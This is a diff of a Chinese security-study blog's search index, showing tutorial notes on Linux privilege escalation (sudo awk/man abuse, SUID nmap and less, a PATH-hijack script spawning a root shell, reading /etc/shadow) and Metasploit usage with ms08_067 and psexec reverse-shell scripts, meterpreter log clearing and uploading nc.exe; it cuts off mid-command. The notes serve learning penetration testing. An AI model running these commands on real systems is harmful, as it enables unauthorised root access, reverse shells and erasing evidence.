 <p>然后我们就可以使用kali自带的searchsploit来搜索利用代码。</p>
-<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144304.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429144304.png" alt=""></p>
 <p>这里在推荐一个很好用的工具</p>
 <h5 id="Linux-Exploit-Suggester"><a href="#Linux-Exploit-Suggester" class="headerlink" title="Linux Exploit Suggester"></a>Linux Exploit Suggester</h5><p>​    linux exploit_Suggester是一款根据操作系统版本号自动查找相应<a href="https://www.webshell.cc/tag/tiquan" target="_blank" rel="noopener">提权</a>脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p>
 <p>下载地址：<a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p>
@@ -2312,8 +2420,10 @@
 <h4 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h4><p>情况极少。。。。</p>
 <p>passwd 储存了用户，全用户可读，root 可写 shadow 存储密码的 hash，仅 root 可读写</p>
 <p>passwd 文件：</p>
-<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144854.png" alt=""></p>
+<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E7%BB%BC%E8%BF%B0%5CQQ%E6%88%AA%E5%9B%BE20200429144854.png" alt=""></p>
 <p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（这样非 root 就看不到了）。而 shadow 里面最重要的就是密码的 hash</p>
+<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E7%BB%BC%E8%BF%B0%5CQQ%E6%88%AA%E5%9B%BE20200430191351.png" alt=""></p>
+<p>以非root用户打开，提示没有权限。</p>
 <p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145009.png" alt=""></p>
 <h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>查看两个文件：</p>
 <figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span> -l <span class="string">/etc/passwd</span> <span class="string">/etc/shadow</span></span><br></pre></td></tr></table></figure>
@@ -2322,10 +2432,10 @@
 <li>shadow中存储了用户的密码hash，但是如果passwd可写，将passwd中的x改为一个已知密码的hash，那么系统在验证密码时将以passwd的为准。</li>
 <li>shadow可读的情况下，可以使用john或其他来进行暴力破解hash。</li>
 </ul>
-<h4 id="4、sudo-滥用"><a href="#4、sudo-滥用" class="headerlink" title="4、sudo 滥用"></a><strong>4、sudo 滥用</strong></h4><p>sudo 大家经常遇到，比如执行权限不够时加 sudo 执行，sudo 是让普通用户使用超级用户的命令。其配置文件为 /etc/sudoers，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p>
+<h4 id="sudo-滥用"><a href="#sudo-滥用" class="headerlink" title="sudo 滥用"></a>sudo 滥用</h4><p>sudo 是一个linux经常用到的命令，比如执行权限不够时加 sudo 执行，sudo 是让普通用户使用超级用户的命令。其配置文件为 <strong>/etc/sudoers</strong>，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p>
 <p>查看可以执行哪些命令，即不需要知道 root 密码时，需验证自身普通权限的密码</p>
 <p><code>sudo -l</code></p>
-<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429163933.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429163933.png" alt=""></p>
 <p>可以支持所有命令，下面参考这个网址:</p>
 <blockquote>
 <p><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
@@ -2336,18 +2446,18 @@
 <p>sudo su</p>
 </blockquote>
 <p>输入普通权限用户密码，切换为 root</p>
-<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164436.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429164436.png" alt=""></p>
 <p><strong>2、awk</strong></p>
 <blockquote>
 <p>sudo awk ‘BEGIN {system(“/bin/sh”)}’</p>
 </blockquote>
-<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164548.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429164548.png" alt=""></p>
 <p><strong>3、man</strong></p>
 <blockquote>
 <p>sudo man man</p>
 </blockquote>
-<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164826.png" alt=""></p>
-<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164919.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429164826.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429164919.png" alt=""></p>
 <blockquote>
 </blockquote>
 <h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><blockquote>
@@ -2361,7 +2471,7 @@
 <blockquote>
 <p>cat /etc/crontab</p>
 </blockquote>
-<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429165555.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429165555.png" alt=""></p>
 <p>我没有设置定时任务，模拟一下，如果里面有个 <code>1.python</code></p>
 <blockquote>
 <p>ls -al /tmp/1.py //查看是否有w权限 </p>
@@ -2391,7 +2501,7 @@
 <p>查找系统上运行的所有SUID可执行文件：</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">1. <span class="builtin-name">find</span> / -user root -perm -4000 -<span class="builtin-name">print</span> 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">2. <span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">3. <span class="builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
 
-<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145451.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429145451.png" alt=""></p>
 <h5 id="例NMAP"><a href="#例NMAP" class="headerlink" title="例NMAP"></a>例NMAP</h5><p>较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p>
 <p>交互模式可以通过执行Nmap参数” interactive “</p>
 <figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure>
@@ -2418,16 +2528,16 @@
 <h5 id="例Less"><a href="#例Less" class="headerlink" title="例Less"></a>例Less</h5><p>Less和More都执行以用来提权。</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">less <span class="regexp">/etc/</span>passwd</span><br><span class="line">!<span class="regexp">/bin/</span>sh</span><br></pre></td></tr></table></figure>
 
-<h4 id="8、环境变量劫持-SUID-扩展"><a href="#8、环境变量劫持-SUID-扩展" class="headerlink" title="8、环境变量劫持-SUID 扩展"></a><strong>8、环境变量劫持-SUID 扩展</strong></h4><p>通过劫持环境变量，达到执行任意命令的目的。上述只是执行 cat 命令，但我们最终目的是为了提权，而不是以 root 权限只执行单个 cat 命令。 </p>
+<h4 id="环境变量劫持-SUID-扩展"><a href="#环境变量劫持-SUID-扩展" class="headerlink" title="环境变量劫持-SUID 扩展"></a>环境变量劫持-SUID 扩展</h4><p>通过劫持环境变量，达到执行任意命令的目的。上述只是执行 cat 命令，但我们最终目的是为了提权，而不是以 root 权限只执行单个 cat 命令。 </p>
 <p>linux 下执行命令，如 cat，是去环境变量查找 ,将 cat 替换</p>
 <p><strong>测试：</strong></p>
 <p>把新建一个 /tmp/cat，而 cat 内容为我们脚本，当用户执行 cat 命令，cat /etc/shadow，则执行我们的脚本 </p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">cat &gt;&gt; <span class="regexp">/tmp/</span>ls &lt;&lt;EOF  </span><br><span class="line"><span class="meta">#!/usr/bin/python  </span></span><br><span class="line">print <span class="string">"this is not the true cat"</span>  </span><br><span class="line">print <span class="string">"here is a root shell!"</span>  </span><br><span class="line"><span class="keyword">import</span> pty;pty.spawn(<span class="string">"/bin/sh"</span>)  </span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
 
 <p>此时再执行 ./suid-exp，可执行我们定义的脚本，因为 suid-exp 以管理员执行 cat 命令，而 linux 的 system 是根据环境变量来执行 cat 的，原本是默认的 cat，当修改了之后，cat 就不再是原来的 cat，而是我们自己定义的脚本，从而达到执行任意命令的目的，即可去提权。</p>
-<h4 id="10、docker-组提权"><a href="#10、docker-组提权" class="headerlink" title="10、docker 组提权"></a><strong>10、docker 组提权</strong></h4><p>docker组用户提权，目的是利用docker组的用户来提权，因为docker组用户在容器下为root权限，通过挂载方式在容器下给本机添加sudo权限的用户，从而可以利用sudo命令。如果没有拥有sudo权限的用户，是无法执行sudo命令，在kali下会提示用户不在sudoers等提示。 </p>
-<p>可以参考我的这篇文章：  《Docker提权实战测试》  <a href="https://www.secquan.org/Discuss/1070515" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070515</a></p>
-<h4 id="11、服务漏洞"><a href="#11、服务漏洞" class="headerlink" title="11、服务漏洞"></a><strong>11、服务漏洞</strong></h4><blockquote>
+<h4 id="docker-组提权"><a href="#docker-组提权" class="headerlink" title="docker 组提权"></a>docker 组提权</h4><p>docker组用户提权，目的是利用docker组的用户来提权，因为docker组用户在容器下为root权限，通过挂载方式在容器下给本机添加sudo权限的用户，从而可以利用sudo命令。如果没有拥有sudo权限的用户，是无法执行sudo命令，在kali下会提示用户不在sudoers等提示。 </p>
+<p>可以参考这篇文章：  《Docker提权实战测试》  <a href="https://www.secquan.org/Discuss/1070515" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070515</a></p>
+<h4 id="服务漏洞"><a href="#服务漏洞" class="headerlink" title="服务漏洞"></a>服务漏洞</h4><blockquote>
 <p>netstat -antup #查看各种网络服务 </p>
 </blockquote>
 <p>然后把敏感端口转发出来，用本地的工具进行攻击，可能拿到远程 root，即通过漏洞拿到 root 权限 windows 用 lcx 做端口转发，linux 用 nc、socat 做端口转发</p>
@@ -2450,7 +2560,16 @@
 <blockquote>
 <p><a href="https://www.secquan.org/Discuss/1069715#reply8" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1069715#reply8</a></p>
 </blockquote>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.freebuf.com/articles/system/129549.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/129549.html</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1544037" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1544037</a></p>
+<p><a href="https://www.xmsec.cc/guide-linux-privilege-escalation/" target="_blank" rel="noopener">https://www.xmsec.cc/guide-linux-privilege-escalation/</a></p>
 ]]></content>
+      <categories>
+        <category>渗透测试学习</category>
+      </categories>
+      <tags>
+        <tag>linux提权</tag>
+      </tags>
   </entry>
   <entry>
     <title>nginx中间件漏洞</title>
@@ -2913,54 +3032,6 @@
       </categories>
   </entry>
   <entry>
-    <title>纵观渗透测试中的提权</title>
-    <url>/2020/04/03/windows-chang-jian-ti-quan-fang-shi-zong-jie/</url>
-    <content><![CDATA[<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文主要是为了总结渗透测试中我们常见的提权的思路与方式，不作详细步骤解释。</p>
-<h3 id="提权的分类"><a href="#提权的分类" class="headerlink" title="提权的分类"></a>提权的分类</h3><p>提权的分类方法和分类角度有很多，这里我们选几种角度对其进行分类</p>
-<h3 id="windows提权："><a href="#windows提权：" class="headerlink" title="windows提权："></a>windows提权：</h3><h4 id="一、本地提权"><a href="#一、本地提权" class="headerlink" title="一、本地提权"></a>一、本地提权</h4><h5 id="溢出提权："><a href="#溢出提权：" class="headerlink" title="溢出提权："></a>溢出提权：</h5><h6 id="1-远程溢出"><a href="#1-远程溢出" class="headerlink" title="1.远程溢出"></a>1.远程溢出</h6><p>​      远程溢出提权是指攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用响应的溢出程序，即可获取到远程服务器的root权限。</p>
-<p>​    攻击者在攻击服务器时，使用远程溢出这种溢出攻击这种攻击手段是比较少的，服务器通常都打了漏洞补丁，这样旧的溢出漏洞一般不会再起作用，而新的溢出漏洞少之又少，可以说远程溢出漏洞已经”日落西山”了。</p>
-<h6 id="2-本地溢出"><a href="#2-本地溢出" class="headerlink" title="2.本地溢出"></a>2.本地溢出</h6><p> 本地溢出提权首先要有服务器的一个用户，且需要有执行的权限的用户才能发起提权，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出root权限。</p>
-<h5 id="Getpass-提权"><a href="#Getpass-提权" class="headerlink" title="Getpass 提权"></a>Getpass 提权</h5><h5 id="hash传递入侵"><a href="#hash传递入侵" class="headerlink" title="hash传递入侵"></a>hash传递入侵</h5><h5 id="lpk提权"><a href="#lpk提权" class="headerlink" title="lpk提权"></a>lpk提权</h5><h4 id="二、数据库提权"><a href="#二、数据库提权" class="headerlink" title="二、数据库提权"></a>二、数据库提权</h4><h5 id="1-mysql提权"><a href="#1-mysql提权" class="headerlink" title="1.mysql提权"></a>1.mysql提权</h5><ul>
-<li><strong>功能型：</strong>udf提权</li>
-<li><strong>技巧型：</strong>启动项提权</li>
-<li><strong>漏洞型：</strong>mof提权</li>
-</ul>
-<h5 id="2-SQL-Server提权"><a href="#2-SQL-Server提权" class="headerlink" title="2.SQL Server提权"></a>2.SQL Server提权</h5><h5 id="3-Oracle提权"><a href="#3-Oracle提权" class="headerlink" title="3.Oracle提权"></a>3.Oracle提权</h5><ul>
-<li>虚拟主机提权</li>
-<li>星外提权</li>
-<li>西部数码提权</li>
-<li>华众虚拟主机提权</li>
-</ul>
-<h4 id="三、第三方软件提权"><a href="#三、第三方软件提权" class="headerlink" title="三、第三方软件提权"></a>三、第三方软件提权</h4><h5 id="1-FTP提权"><a href="#1-FTP提权" class="headerlink" title="1.FTP提权"></a>1.FTP提权</h5><ul>
-<li>serv-u提权</li>
-<li>G6-FTP提权</li>
-<li>FileZilla提权</li>
-<li>FlashFXP提权</li>
-<li>PcAnywhere提权</li>
-<li>Xlight FTP Server提权</li>
-</ul>
-<h5 id="2-远程软件提权"><a href="#2-远程软件提权" class="headerlink" title="2.远程软件提权"></a>2.远程软件提权</h5><ul>
-<li>vnc</li>
-<li>radmin</li>
-</ul>
-<h5 id="3-其他"><a href="#3-其他" class="headerlink" title="3.其他"></a>3.其他</h5><ul>
-<li>Magic Winmail提权</li>
-<li>navicat提权</li>
-<li>zend</li>
-<li>搜狗输入法提权</li>
-<li>PR提权详解</li>
-<li>巴西烤肉提权</li>
-<li>利用360提权</li>
-</ul>
-]]></content>
-      <categories>
-        <category>渗透测试学习</category>
-      </categories>
-      <tags>
-        <tag>提权方式</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>其他中间件漏洞</title>
     <url>/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/</url>
     <content><![CDATA[<h2 id="其它中间件相关漏洞"><a href="#其它中间件相关漏洞" class="headerlink" title="其它中间件相关漏洞"></a>其它中间件相关漏洞</h2><h4 id="FastCGI未授权访问、任意命令执行"><a href="#FastCGI未授权访问、任意命令执行" class="headerlink" title="FastCGI未授权访问、任意命令执行"></a>FastCGI未授权访问、任意命令执行</h4><p><strong>1、 漏洞简介及成因</strong></p>
@@ -3020,59 +3091,6 @@
       <tags>
         <tag>FastCGI</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>纵观渗透测试中的提权</title>
-    <url>/2020/04/03/ti-quan-fang-shi-zong-jie/</url>
-    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文主要是为了总结渗透测试中我们常见的提权的思路与方式，不作详细步骤解释。</p>
-<h3 id="提权的分类"><a href="#提权的分类" class="headerlink" title="提权的分类"></a>提权的分类</h3><p>提权的分类方法和分类角度有很多，这里我们选几种角度对其进行分类</p>
-<h3 id="windows提权："><a href="#windows提权：" class="headerlink" title="windows提权："></a>windows提权：</h3><h4 id="一、本地提权"><a href="#一、本地提权" class="headerlink" title="一、本地提权"></a>一、本地提权</h4><h5 id="溢出提权："><a href="#溢出提权：" class="headerlink" title="溢出提权："></a>溢出提权：</h5><h6 id="1-远程溢出"><a href="#1-远程溢出" class="headerlink" title="1.远程溢出"></a>1.远程溢出</h6><p>​      远程溢出提权是指攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用响应的溢出程序，即可获取到远程服务器的root权限。</p>
-<p>​    攻击者在攻击服务器时，使用远程溢出这种溢出攻击这种攻击手段是比较少的，服务器通常都打了漏洞补丁，这样旧的溢出漏洞一般不会再起作用，而新的溢出漏洞少之又少，可以说远程溢出漏洞已经”日落西山”了。</p>
-<h6 id="2-本地溢出"><a href="#2-本地溢出" class="headerlink" title="2.本地溢出"></a>2.本地溢出</h6><p> 本地溢出提权首先要有服务器的一个用户，且需要有执行的权限的用户才能发起提权，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出root权限。</p>
-<h5 id="Getpass-提权"><a href="#Getpass-提权" class="headerlink" title="Getpass 提权"></a>Getpass 提权</h5><h5 id="hash传递入侵"><a href="#hash传递入侵" class="headerlink" title="hash传递入侵"></a>hash传递入侵</h5><h5 id="lpk提权"><a href="#lpk提权" class="headerlink" title="lpk提权"></a>lpk提权</h5><h4 id="二、数据库提权"><a href="#二、数据库提权" class="headerlink" title="二、数据库提权"></a>二、数据库提权</h4><h5 id="1-mysql提权"><a href="#1-mysql提权" class="headerlink" title="1.mysql提权"></a>1.mysql提权</h5><ul>
-<li><strong>功能型：</strong>udf提权</li>
-<li><strong>技巧型：</strong>启动项提权</li>
-<li><strong>漏洞型：</strong>mof提权</li>
-</ul>
-<h5 id="2-SQL-Server提权"><a href="#2-SQL-Server提权" class="headerlink" title="2.SQL Server提权"></a>2.SQL Server提权</h5><h5 id="3-Oracle提权"><a href="#3-Oracle提权" class="headerlink" title="3.Oracle提权"></a>3.Oracle提权</h5><ul>
-<li>虚拟主机提权</li>
-<li>星外提权</li>
-<li>西部数码提权</li>
-<li>华众虚拟主机提权</li>
-</ul>
-<h4 id="三、第三方软件提权"><a href="#三、第三方软件提权" class="headerlink" title="三、第三方软件提权"></a>三、第三方软件提权</h4><h5 id="1-FTP提权"><a href="#1-FTP提权" class="headerlink" title="1.FTP提权"></a>1.FTP提权</h5><ul>
-<li>serv-u提权</li>
-<li>G6-FTP提权</li>
-<li>FileZilla提权</li>
-<li>FlashFXP提权</li>
-<li>PcAnywhere提权</li>
-<li>Xlight FTP Server提权</li>
-</ul>
-<h5 id="2-远程软件提权"><a href="#2-远程软件提权" class="headerlink" title="2.远程软件提权"></a>2.远程软件提权</h5><ul>
-<li>vnc</li>
-<li>radmin</li>
-</ul>
-<h5 id="3-其他"><a href="#3-其他" class="headerlink" title="3.其他"></a>3.其他</h5><ul>
-<li>Magic Winmail提权</li>
-<li>navicat提权</li>
-<li>zend</li>
-<li>搜狗输入法提权</li>
-<li>PR提权详解</li>
-<li>巴西烤肉提权</li>
-<li>利用360提权</li>
-</ul>
-]]></content>
-      <categories>
-        <category>渗透测试学习</category>
-      </categories>
-      <tags>
-        <tag>提权方式</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>重定向技术</title>
-    <url>/2020/04/28/chang-jian-de-liu-liang-cao-kong-he-sui-dao-li-yong-fang-shi/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>敏感信息泄露常见类型</title>
@@ -4217,10 +4235,10 @@
 <ul>
 <li>早期版本需要先启动数据库再启动 msf</li>
 </ul>
-<p><img src="https://i.imgur.com/zXzemZd.png" alt="img"></p>
+<p><img src="zXzemZd.png" alt="img"></p>
 </li>
 </ul>
-<p><img src="https://i.imgur.com/mgJH3KP.jpg" alt="img"></p>
+<p><img src="mgJH3KP.jpg" alt="img"></p>
 <h4 id="Metasploit-架构"><a href="#Metasploit-架构" class="headerlink" title="Metasploit 架构"></a>Metasploit 架构</h4><ul>
 <li>Rex<ul>
 <li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
@@ -4312,21 +4330,21 @@
 <h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p>
 <figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">root@kali:~# cat ms08067.rb </span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="comment">10.10.10.147</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">RPORT 445</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">PAYLOAD windows</span>/shell/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 10.10.10.131</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT 4444</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.imgur.com/rNO4Mud.png" alt="img"></p>
+<p><img src="rNO4Mud.png" alt="img"></p>
 <figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">root@kali:~# cat psexec.rb </span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="comment">10.10.10.148</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">PAYLOAD windows</span>/shell/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 10.10.10.131</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT 4444</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBUSER Administrator</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBPASS 123456</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.imgur.com/ctvHDYR.png" alt="img"></p>
+<p><img src="ctvHDYR.png" alt="img"></p>
 <h5 id="2-Passive-Exploits"><a href="#2-Passive-Exploits" class="headerlink" title="2. Passive Exploits"></a>2. Passive Exploits</h5><p>攻击者等待受害者来触发连接，反弹到攻击者</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">root@kali:~# cat ms07017.rb </span><br><span class="line">use exploit/windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line"><span class="builtin-name">set</span> URIPATH /</span><br><span class="line"><span class="builtin-name">set</span> SRVHOST 0.0.0.0</span><br><span class="line"><span class="builtin-name">set</span> PAYLOAD windows/shell/reverse_tcp</span><br><span class="line"><span class="builtin-name">set</span> EXITFUNC thread</span><br><span class="line"><span class="builtin-name">set</span> LHOST 10.10.10.131</span><br><span class="line"><span class="builtin-name">set</span> LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.imgur.com/meKMAdB.png" alt="img"></p>
-<p><img src="https://i.imgur.com/aEu1anZ.png" alt="img"></p>
+<p><img src="meKMAdB.png" alt="img"></p>
+<p><img src="aEu1anZ.png" alt="img"></p>
 <h4 id="6-生成payload"><a href="#6-生成payload" class="headerlink" title="6.生成payload"></a>6.生成payload</h4><ul>
 <li>用法</li>
 </ul>
 <figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">msf &gt; <span class="built_in">search</span> ms08-<span class="number">067</span></span><br><span class="line">msf &gt; use payload/windows/<span class="keyword">shell</span>/bind_tcp</span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate  #获得shellcode</span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate -h</span><br><span class="line">    Usage: generate [<span class="keyword">options</span>]</span><br><span class="line">    Generates <span class="keyword">a</span> payload.</span><br><span class="line">    OPTIONS:</span><br><span class="line">        -E        强制编码。</span><br><span class="line">        -<span class="keyword">b</span> <span class="symbol">&lt;opt&gt;</span>  要避免的字符列表：<span class="string">'\ x00 \ xff'</span></span><br><span class="line">        -<span class="keyword">e</span> <span class="symbol">&lt;opt&gt;</span>  要使用的编码器模块的名称。</span><br><span class="line">        -<span class="keyword">f</span> <span class="symbol">&lt;opt&gt;</span>  输出文件名（否则为stdout）</span><br><span class="line">        -h        帮助横幅。</span><br><span class="line">        -i <span class="symbol">&lt;opt&gt;</span>  编码迭代的次数。</span><br><span class="line">        -<span class="keyword">k</span>        保持模板可执行的功能</span><br><span class="line">        -<span class="keyword">o</span> <span class="symbol">&lt;opt&gt;</span>  以VAR = VAL格式逗号分隔的选项列表。</span><br><span class="line">        -<span class="keyword">p</span> <span class="symbol">&lt;opt&gt;</span>  输出平台</span><br><span class="line">        -s <span class="symbol">&lt;opt&gt;</span>  NOP sled length.</span><br><span class="line">        -t <span class="symbol">&lt;opt&gt;</span>  输出格式: bash,<span class="keyword">c</span>,csharp,dw,dword,hex,java,js_be,js_le,num,<span class="keyword">perl</span>,pl,powershell,ps1,<span class="keyword">py</span>,<span class="keyword">python</span>,raw,rb,<span class="keyword">ruby</span>,<span class="keyword">sh</span>,vbapplication,vbscript,asp,aspx,aspx-<span class="keyword">exe</span>,axis2,dll,elf,elf-<span class="keyword">so</span>,<span class="keyword">exe</span>,<span class="keyword">exe</span>-<span class="keyword">only</span>,<span class="keyword">exe</span>-service,<span class="keyword">exe</span>-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-<span class="keyword">exe</span>,vba-psh,vbs,war</span><br><span class="line">        -<span class="keyword">x</span> <span class="symbol">&lt;opt&gt;</span>  要使用的可执行模板</span><br><span class="line"></span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.imgur.com/wEztOAj.png" alt="img"></p>
+<p><img src="wEztOAj.png" alt="img"></p>
 <ul>
 <li>自动绕过坏字符</li>
 </ul>
@@ -4337,7 +4355,7 @@
 </ul>
 <figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">msf payload(windows/<span class="keyword">shell</span><span class="bash">/bind_tcp) &gt; show encoders</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.imgur.com/siajCwd.png" alt="img"></p>
+<p><img src="siajCwd.png" alt="img"></p>
 <ul>
 <li>注入文件</li>
 </ul>
@@ -4370,7 +4388,7 @@
 </ul>
 <h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# cat metepreter.rb </span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"><span class="keyword">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.147</span></span><br><span class="line"><span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.imgur.com/b9G8Uq6.png" alt="img"></p>
+<p><img src="b9G8Uq6.png" alt="img"></p>
 <ul>
 <li>帮助文件</li>
 </ul>
@@ -4381,7 +4399,7 @@
 </ul>
 <figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; execute -f cmd.exe</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getuid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getpid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; clearev   # 清除日志</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; upload 